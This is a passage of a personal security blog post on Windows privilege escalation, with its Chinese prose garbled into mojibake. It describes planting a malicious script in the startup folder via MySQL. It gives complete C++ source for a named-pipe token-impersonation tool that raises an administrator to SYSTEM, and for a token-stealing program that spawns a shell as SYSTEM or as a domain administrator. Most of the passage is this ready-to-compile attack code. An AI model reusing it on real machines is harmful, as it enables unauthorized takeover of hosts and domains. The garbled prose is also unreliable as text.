<h3 id="å¯åŠ¨é¡¹ææƒ"><a href="#å¯åŠ¨é¡¹ææƒ" class="headerlink" title="å¯åŠ¨é¡¹ææƒ"></a>å¯åŠ¨é¡¹ææƒ</h3><p>è¯´ç™½äº†ï¼Œå°±æ˜¯é€šè¿‡mysqlçš„é«˜æƒé™ï¼Œå‘windowså¼€æœºå¯åŠ¨é¡¹æ–‡ä»¶å¤¹é‡Œæ”¾å…¥æ¶æ„vbsæˆ–è€…batè„šæœ¬,æœºå™¨é‡å¯åè‡ªåŠ¨æ‰§è¡Œã€‚æ€ä¹ˆè®©æœºå™¨é‡å¯ï¼Ÿç­‰ç®¡ç†å‘˜æˆ–è€… ä¸€äº›å¯å¯¼è‡´æœåŠ¡å™¨è“å±çš„EXP<br>å¯åŠ¨é¡¹è·¯å¾„ä¸€èˆ¬ä¸ºï¼š<br>C:\Documents and Settings\All Users\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨<br>C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&quot;xxx&quot;) into dumpfile &quot;xxxx&quot;;</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144534.png" alt="QQæˆªå›¾20210217144534"></p>
<p>æ²¡ä»€ä¹ˆå¥½è¯´çš„</p>
<h2 id="å‘½åç®¡é“ææƒ"><a href="#å‘½åç®¡é“ææƒ" class="headerlink" title="å‘½åç®¡é“ææƒ"></a>å‘½åç®¡é“ææƒ</h2><p>ææƒæ–¹å¼ä¸º ä»¤ç‰Œæ¨¡ä»¿ã€‚ Token Impersonation .</p>
<p>meterpreterçš„getsystemçš„æå–æ–¹æ³•ä¹‹ä¸€å°±æ˜¯è¿™ä¸ªæ–¹æ³•</p>
<p>ææƒè¿‡ç¨‹ä¸ºä»administratorç”¨æˆ·æåˆ°SYSTEMæƒé™ã€‚ä»æ™®é€šç”¨æˆ·ææƒåˆ°adminåŠä»¥ä¸Šæƒé™æ˜¯ä¸å¯å–çš„ï¼Œå› ä¸ºæ™®é€šç”¨æˆ·åˆ›å»ºçš„å‘½åç®¡é“æ²¡æœ‰ <code>SeImpersonatePrivilege</code>ï¼Œåœ¨å¤åˆ¶ä»¤ç‰Œæ—¶ä¼šå‡ºç°1346é”™è¯¯ã€‚</p>
<p>è¯¥æ–¹æ³•æŠ€æœ¯ç»†èŠ‚ä¸ºï¼šä»¥ç®¡ç†å‘˜æƒé™åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œå†é€šè¿‡åˆ›å»ºSYSTEMæƒé™æœåŠ¡ï¼Œè®©æœåŠ¡è¿ä¸Šå‘½åç®¡é“ï¼Œéšåæˆ‘ä»¬é€šè¿‡æ¨¡æ‹Ÿå®¢æˆ·ç«¯ï¼Œè·å¾—SYSTEMæƒé™çš„ä»¤ç‰Œï¼Œéšåå°†å…¶å¤åˆ¶ï¼Œå†ç”¨å¤åˆ¶åçš„ä»¤ç‰Œåˆ›å»ºæ–°è¿›ç¨‹ï¼ˆå¦‚CMD)ï¼Œæ–°è¿›ç¨‹çš„æƒé™å³SYSTEMæƒé™ã€‚</p>
<p>è¿™é‡Œè´´ä¸Šå®ç°ä»£ç .<br>é¦–å…ˆæ˜¯è¢«åˆ›å»ºçš„æœåŠ¡çš„å®ç°ä»£ç ï¼Œè¯¥æœåŠ¡å¯åŠ¨åä¼šä¸æ–­å‘æœåŠ¡å™¨å‘½åç®¡é“å»ºç«‹é“¾æ¥<br>ç”Ÿæˆå¥½åï¼Œæ˜¯Service.exe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">SERVICE_STATUS m_ServiceStatus;</span><br><span class="line">SERVICE_STATUS_HANDLE m_ServiceStatusHandle;</span><br><span class="line">BOOL bRunning;</span><br><span class="line">void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);</span><br><span class="line">void WINAPI HandlerFunc(DWORD code);</span><br><span class="line">int main() &#123;</span><br><span class="line">	WCHAR Servicename[] &#x3D; L&quot;ServiceA&quot;;</span><br><span class="line">	SERVICE_TABLE_ENTRY Table[] &#x3D; &#123; &#123;Servicename,ServiceMain&#125;,&#123;NULL,NULL&#125; &#125;;</span><br><span class="line">	StartServiceCtrlDispatcher(Table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	m_ServiceStatus.dwServiceType &#x3D; SERVICE_WIN32_OWN_PROCESS;</span><br><span class="line">	m_ServiceStatus.dwCurrentState &#x3D; SERVICE_START_PENDING;</span><br><span class="line">	m_ServiceStatus.dwControlsAccepted &#x3D; SERVICE_ACCEPT_STOP;</span><br><span class="line">	m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">	m_ServiceStatus.dwServiceSpecificExitCode &#x3D; 0;</span><br><span class="line">	m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">	m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">	m_ServiceStatusHandle &#x3D; RegisterServiceCtrlHandler(L&quot;ServiceA&quot;, HandlerFunc);</span><br><span class="line">	m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">	m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">	m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line">	SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">	bRunning &#x3D; true;</span><br><span class="line">	while (bRunning) &#123;</span><br><span class="line">	LPCWSTR PipeName &#x3D; L&quot;\\\\.\\pipe\\testpipe&quot;;</span><br><span class="line">	HANDLE PipeHandle&#x3D;NULL;</span><br><span class="line">	BOOL PipeInstance;</span><br><span class="line">	WCHAR message[512] &#x3D; &#123; 0 &#125;;</span><br><span class="line">	DWORD bytesWritten &#x3D; 0;</span><br><span class="line">	BOOL Flag &#x3D; true;</span><br><span class="line">	wchar_t message2[] &#x3D; L&quot;HELL&quot;;</span><br><span class="line">	DWORD messageLength &#x3D; lstrlen(message2) * 2;</span><br><span class="line">	do &#123;</span><br><span class="line">		PipeHandle &#x3D; CreateFile(PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class="line">	&#125; while (PipeHandle &#x3D;&#x3D; INVALID_HANDLE_VALUE);</span><br><span class="line"></span><br><span class="line">	WriteFile(PipeHandle, &amp;message2, messageLength, &amp;bytesWritten, NULL);</span><br><span class="line"></span><br><span class="line">	Flag &#x3D; ReadFile(PipeHandle, &amp;message, 512, &amp;bytesWritten, NULL);</span><br><span class="line">	std::cout &lt;&lt; &quot;Message:&quot; &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void WINAPI HandlerFunc(DWORD code) &#123;</span><br><span class="line">	switch (code) &#123;</span><br><span class="line">	case SERVICE_CONTROL_PAUSE:</span><br><span class="line">		m_ServiceStatus.dwCurrentState &#x3D; SERVICE_PAUSED;</span><br><span class="line">		break;</span><br><span class="line">	case SERVICE_CONTROL_CONTINUE:</span><br><span class="line">		m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">		break;</span><br><span class="line">	case SERVICE_CONTROL_STOP:</span><br><span class="line">		m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">		m_ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED;</span><br><span class="line">		m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">		m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">		SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">		bRunning &#x3D; false;</span><br><span class="line">		break;</span><br><span class="line">	case SERVICE_CONTROL_INTERROGATE:</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ˜¯ä¸»ä½“ï¼Œå‘½åç®¡é“æœåŠ¡å™¨ã€‚ç”Ÿæˆåæ˜¯Server.exe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	LPCWSTR pipeName &#x3D; L&quot;\\\\.\\pipe\\testpipe&quot;;</span><br><span class="line">	LPVOID pipeBuffer &#x3D; NULL;</span><br><span class="line">	HANDLE serverPipe;</span><br><span class="line">	DWORD readBytes &#x3D; 0;</span><br><span class="line">	DWORD readBuffer &#x3D; 0;</span><br><span class="line">	int err &#x3D; 0;</span><br><span class="line">	BOOL isPipeConnected;</span><br><span class="line">	BOOL isPipeOpen;</span><br><span class="line">	wchar_t message[] &#x3D; L&quot;HELL&quot;;</span><br><span class="line">	DWORD messageLenght &#x3D; lstrlen(message) * 2;</span><br><span class="line">	DWORD bytesWritten &#x3D; 0;</span><br><span class="line">	WCHAR message2[512] &#x3D; &#123; 0 &#125;;</span><br><span class="line">&#x2F;&#x2F;Open a Named Pipe,Wait for a connection</span><br><span class="line">	std::wcout &lt;&lt; &quot;Creating named pipe &quot; &lt;&lt; pipeName &lt;&lt; std::endl;</span><br><span class="line">	serverPipe &#x3D; CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Create a service of system to connect to our NamedPipe.</span><br><span class="line"></span><br><span class="line">	char servicename[] &#x3D; &quot;Service.exe&quot;;</span><br><span class="line">	char servicepath[_MAX_PATH];</span><br><span class="line">	SERVICE_STATUS status;</span><br><span class="line">	GetModuleFileNameA(LoadLibraryA(servicename), servicepath, sizeof(servicepath));</span><br><span class="line">	SC_HANDLE scManager &#x3D; OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	if (GetLastError() &#x3D;&#x3D; 0) &#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;ERROR OpenSCManager:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	SC_HANDLE scService &#x3D; CreateServiceA(scManager, servicename, servicename,</span><br><span class="line">		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,</span><br><span class="line">		servicepath, NULL, NULL, NULL, NULL, NULL);</span><br><span class="line">	if (!scService) &#123;</span><br><span class="line">		if (GetLastError() &#x3D;&#x3D; 1073) &#123;</span><br><span class="line">			std::cout &lt;&lt; &quot;The Service has been exsisted&quot; &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			std::cout &lt;&lt; &quot;ERROR CreateServiceA:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	SC_HANDLE scServiceA &#x3D; OpenServiceA(scManager, servicename, SERVICE_ALL_ACCESS);</span><br><span class="line">	if (StartService(scServiceA, 0, NULL)) &#123;</span><br><span class="line">		std::cout&lt;&lt;&quot;service Start success&quot;&lt;&lt;std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		if (GetLastError() &#x3D;&#x3D; 1056) &#123;</span><br><span class="line">			std::cout &lt;&lt; &quot;service is running,don&#39;t need to start again&quot; &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#x2F;&#x2F;Connect !</span><br><span class="line">	isPipeConnected &#x3D; ConnectNamedPipe(serverPipe, NULL);</span><br><span class="line"></span><br><span class="line">	if (isPipeConnected) &#123;</span><br><span class="line">		std::wcout &lt;&lt; &quot;Incoming connection to &quot; &lt;&lt; pipeName &lt;&lt; std::endl;</span><br><span class="line">		ReadFile(serverPipe, &amp;message2, 512, &amp;bytesWritten, NULL);</span><br><span class="line">		std::cout &lt;&lt; message2;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;Does not connected Error: &quot;&lt;&lt;GetLastError() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	std::wcout &lt;&lt; &quot;Sending message: &quot; &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">	WriteFile(serverPipe, message, messageLenght, &amp;bytesWritten, NULL);</span><br><span class="line">&#x2F;&#x2F;Toekn Impersonation</span><br><span class="line">	std::wcout &lt;&lt; &quot;Impersonating the client...&quot; &lt;&lt; std::endl;</span><br><span class="line">	if (!ImpersonateNamedPipeClient(serverPipe)) &#123;</span><br><span class="line">		std::cout&lt;&lt;&quot;ImpersonateNamedPipeClient ERROR: &quot;&lt;&lt;GetLastError()&lt;&lt;std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">	std::cout &lt;&lt; &quot;ImpersonateNamedPipeClient success&quot; &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	STARTUPINFOA si;</span><br><span class="line">	PROCESS_INFORMATION pi &#x3D; &#123;&#125;;</span><br><span class="line">	ZeroMemory(&amp;pi, sizeof(pi));</span><br><span class="line">	ZeroMemory(&amp;si, sizeof(si));</span><br><span class="line">	si.cb &#x3D; sizeof(si);</span><br><span class="line">	HANDLE token;</span><br><span class="line">	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;token)) &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;GetCurrentThread ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CHAR command1[] &#x3D; &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;;</span><br><span class="line">	WCHAR command2[] &#x3D; L&quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;;</span><br><span class="line">	HANDLE Token;</span><br><span class="line">	if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenImpersonation,&amp;Token)) &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;Impersonate completed&quot; &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	if (!CreateProcessAsUserA(token, NULL, command1, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)) &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;CreateProcessAsUserA ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt;&quot; Now Use CreateProcessWithTokenW&quot;&lt;&lt; std::endl;</span><br><span class="line">		if (!CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, NULL, command2, NULL, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi)) &#123;</span><br><span class="line">			std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	while(1)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬ç”Ÿæˆäº†Service.exe,ç„¶åæŠŠä»–ç§»åˆ°Server.exeåŒçº§ç›®å½•ï¼Œä»¥ç®¡ç†å‘˜æƒé™è¿è¡ŒServer.exe,å³å¯è¾¾åˆ°admin-ã€‹systemçš„ææƒã€‚</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144553.png" alt="QQæˆªå›¾20210217144553"></p>
<p>ç¨‹åºå†™äº†å››å¤©ç»ˆäºå†™å¥½äº†ã€‚ã€‚WIN7ä¸‹å¯ä»¥å®ç°å®Œç¾ææƒã€‚<br>é¡¹ç›®åœ°å€:<a target="_blank" rel="noopener" href="https://github.com/ConsT27/EvilNamedPipe/tree/1.0">https://github.com/ConsT27/EvilNamedPipe/tree/1.0</a></p>
<h2 id="ä»¤ç‰Œçªƒå–"><a href="#ä»¤ç‰Œçªƒå–" class="headerlink" title="ä»¤ç‰Œçªƒå–"></a>ä»¤ç‰Œçªƒå–</h2><p>SYSTEM-&gt;æœ¬æœºä¸Šå…¶ä»–ç”¨æˆ·ï¼ˆåŒ…æ‹¬åŸŸç”¨æˆ·ï¼‰(å¥½å®¶ä¼™ï¼Œåªè¦æœ¬æœºæœ‰systemæƒé™ï¼ŒåŸŸç®¡æ•¢åœ¨æœ¬æœºä¸Šåˆ›å»ºè¿›ç¨‹å°±ç›´æ¥èƒ½æ‹¿åˆ°åŸŸç®¡æƒé™ï¼‰ æˆ–è€…adminè·å–debugæƒé™åå»è·å–SYSTEMæƒé™ï¼ˆè¿™é‡Œæœ‰ä¸€ä¸ªç»†èŠ‚ç‚¹ï¼Œåªæœ‰ownerä¸ºadministratorçš„SYSTEMè¿›ç¨‹æ‰èƒ½è¢«åˆ©ç”¨ï¼Œæ¯”å¦‚lsassï¼Œdllhost)</p>
<p>æŠ€æœ¯ç»†èŠ‚:é€šè¿‡å¯»æ‰¾é«˜æƒé™å¼€å¯çš„è¿›ç¨‹ï¼Œå†å¤åˆ¶å…¶ä»¤ç‰Œç”¨ä»¥åˆ›å»ºæ–°è¿›ç¨‹ï¼Œå³å¯è¾¾åˆ°ææƒç›®çš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Only administrator can get debug priv</span><br><span class="line">BOOL GetDebugPriv() &#123;</span><br><span class="line">	HANDLE Token;</span><br><span class="line">	TOKEN_PRIVILEGES tp;</span><br><span class="line">	LUID Luid;</span><br><span class="line">	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;Token)) &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	tp.PrivilegeCount &#x3D; 1;</span><br><span class="line">	tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class="line">	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid)) &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;LookupPrivilegeValue ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	tp.Privileges[0].Luid &#x3D; Luid;</span><br><span class="line">	if (!AdjustTokenPrivileges(Token, FALSE, &amp;tp, sizeof(tp), NULL, NULL) )&#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;AdjustTokenPrivileges ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	if (GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED) &#123;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">	HANDLE t_process;</span><br><span class="line">	HANDLE token &#x3D; NULL;</span><br><span class="line">	HANDLE token_bak &#x3D; NULL;</span><br><span class="line">	DWORD process_id;</span><br><span class="line">	sscanf_s(argv[1], &quot;%ul&quot;, &amp;process_id);</span><br><span class="line">	WCHAR command[] &#x3D; L&quot;C:\\Windows\\System32\\cmd.exe&quot;;</span><br><span class="line">	STARTUPINFO startupInfo;</span><br><span class="line">	PROCESS_INFORMATION processInformation;</span><br><span class="line">	ZeroMemory(&amp;startupInfo, sizeof(STARTUPINFO));</span><br><span class="line">	ZeroMemory(&amp;processInformation, sizeof(PROCESS_INFORMATION));</span><br><span class="line">	startupInfo.cb &#x3D; sizeof(STARTUPINFO);</span><br><span class="line">	std::cout &lt;&lt; argv[1] &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; &quot;Openning process PID:&quot; &lt;&lt; process_id &lt;&lt; std::endl;</span><br><span class="line">	if (GetDebugPriv()&#x3D;&#x3D; TRUE) &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;Got the debug priv&quot; &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;GetDebugPriv ERROR&quot; &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	system(&quot;whoami &#x2F;priv&quot;);</span><br><span class="line">	t_process &#x3D; OpenProcess(PROCESS_ALL_ACCESS, true, process_id);</span><br><span class="line">	if (!t_process) &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;OpenProcess ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	if (!OpenProcessToken(t_process, TOKEN_ALL_ACCESS, &amp;token)) &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;token_bak)) &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	if (!CreateProcessWithTokenW(token_bak, LOGON_WITH_PROFILE, NULL, command, 0, NULL, NULL, &amp;startupInfo, &amp;processInformation)) &#123;</span><br><span class="line">		std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144620.png" alt="QQæˆªå›¾20210217144620"></p>
<p>è¿™æ˜¯åœ¨win7ä¸‹çš„æµ‹è¯•ç»“æœ const\administrator æ˜¯åŸŸæ§</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">ConsT27</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://const27.com/2021/06/28/Windows%E6%8F%90%E6%9D%83/">http://const27.com/2021/06/28/Windows%E6%8F%90%E6%9D%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://const27.com" target="_blank">ConsT27's Blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">ææƒ</a></div><div class="post_share"><div class="social-share" data-image="https://const27blog.oss-cn-beijing.aliyuncs.com/img/ch.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> æ‰“èµ</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" target="_blank"><img class="post-qr-code-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/06/28/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"><img class="prev-cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/ca.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">redisçš„ä¸€äº›æ”»å‡»æ–¹å¼</div></div></a></div><div class="next-post pull-right"><a href="/2021/06/28/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"><img class="next-cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/au.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">Linux ææƒæ€»ç»“</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/2021/06/28/Bypass UAC/" title="BypassUACæŠ€æœ¯æ€»ç»“"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/kr.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="title">BypassUACæŠ€æœ¯æ€»ç»“</div></div></a></div><div><a href="/2021/06/28/Linuxææƒæ€»ç»“/" title="Linux ææƒæ€»ç»“"><img class="cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/au.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="title">Linux ææƒæ€»ç»“</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84-%EF%BC%88-Trusted-Service-Paths-%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">æ— å¼•å·æœåŠ¡è·¯å¾„ ï¼ˆ Trusted Service Paths ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%88Vulnerable-Services-%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼ˆVulnerable Services ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AlwaysInstallElevated"><span class="toc-number">3.</span> <span class="toc-text">AlwaysInstallElevated</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">4.</span> <span class="toc-text">ä¿¡æ¯æ³„éœ²</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">åŸºäºèµ„æºçš„åŸŸå§”æ´¾æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%9A%84%E5%87%A0%E4%B8%AA%E7%82%B9%EF%BC%9A"><span class="toc-number">5.0.1.</span> <span class="toc-text">åŸç†çš„å‡ ä¸ªç‚¹ï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">5.0.2.</span> <span class="toc-text">æ”»å‡»æµç¨‹:</span></a></li><li class="toc-item 